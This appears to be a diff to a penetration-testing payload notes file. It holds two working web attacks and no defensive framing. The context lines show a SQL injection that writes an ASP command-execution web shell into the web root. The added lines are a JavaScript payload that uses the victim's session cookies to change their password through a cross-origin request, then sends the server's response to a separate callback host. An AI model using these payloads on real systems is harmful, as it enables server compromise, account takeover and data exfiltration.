@@ -438,3 +438,19 @@ End If
 %>
 <form method="POST"><input name=".CMD" size="45" value="<%= szCMD %>"><input type="submit" value="Run"></form>' INTO OUTFILE 'C:\inetpub\wwwroot\shell.asp'--
 ==============================================================================================================================================================
+
+fetch('https://192.168.61.62/:8443/api/me/password', {
+                method:'POST',
+                mode:'cors',
+                credentials:'include',
+                headers:{
+                        'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'
+                },body:'password=Test@123'
+        })
+.then(response => response.json())
+ .then(data => {
+ fetch('http://192.168.49.61/callback?'+encodeURIComponent(JSON.stringify(data)), {
+mode: 'no-cors'
+});
+});
+
